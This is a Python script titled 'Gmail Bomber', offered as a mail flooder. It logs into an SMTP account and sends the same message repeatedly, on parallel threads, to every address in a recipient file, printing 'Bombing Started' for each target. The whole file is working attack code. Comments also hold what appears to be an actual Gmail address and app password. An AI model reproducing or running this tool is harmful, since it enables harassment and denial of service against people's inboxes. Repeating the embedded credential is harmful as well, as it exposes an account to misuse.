import argparse
import smtplib
import sys
import threading
import random

from colorama import Fore
from termcolor import colored

rainbow = ['red', 'green', 'green', 'blue', 'magenta', 'cyan']
r0 = random.randint(0, 5)
r1 = random.randint(0, 5)
r2 = random.randint(0, 5)
r3 = random.randint(0, 5)
r4 = random.randint(0, 5)

print(colored("\t┌──────────────────────────────────┐", rainbow[r0]))
print(colored("\t│╔═╗┌┬┐┌─┐┬┬     ╔╗ ┌─┐┌┬┐┌┐ ┌─┐┬─┐│", rainbow[r1]))
print(colored("\t│║ ╦│││├─┤││     ╠╩╗│ ││││├┴┐├┤ ├┬┘│", rainbow[r2]))
print(colored("\t│╚═╝┴ ┴┴ ┴┴┴─┘   ╚═╝└─┘┴ ┴└─┘└─┘┴└─│", rainbow[r3]))
print(colored("\t└─────────────0xb14cky─────────────┘\n", rainbow[r4]))

parser = argparse.ArgumentParser(
    description="A Simple Gmail Flooder Tool !!",
    formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=47)
)
parser.add_argument("-s", "--sender", help="Sender Email", type=str)
parser.add_argument("-p", "--password", help="Sender Email Password", type=str)
parser.add_argument("-ss", "--server", help="SMTP Server", type=str)
parser.add_argument("-pt", "--port", help="Port Number", type=int)
parser.add_argument("-r", "--receiver", help="File of Receiver Emails", type=str)
parser.add_argument("-nm", "--noOfMsg", help="Number of Messages", type=int)
parser.add_argument("-m", "--message", help="Message in Body", type=str)
args = parser.parse_args()


def send_email(sender, password, server, port, receiver, no_msg, msg):
    s = smtplib.SMTP(server, port)
    s.starttls()
    s.login(sender, password)
    i = 0
    while i < no_msg:
        s.sendmail(sender, receiver, msg)
        i = i + 1
    s.quit()


sender = args.sender  # 'blackhate1256@gmail.com'
password = args.password  # 'omkqlihxldnqcqqa'
server = args.server  # 'smtp.gmail.com'
port = args.port  # 587
no_msg = args.noOfMsg  # 5
msg = args.message  # "Hello"
file_name = args.receiver  # file.txt

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

my_file = open(f"{file_name}", "r")
data = my_file.readlines()

for rec_email in data:
    rec_email = rec_email.strip("\n")
    print(Fore.GREEN, "[+] Bombing Started :- ", rec_email, Fore.RESET)
    t = threading.Thread(target=send_email, args=(sender, password, server, port, rec_email, no_msg, msg))
    t.start()
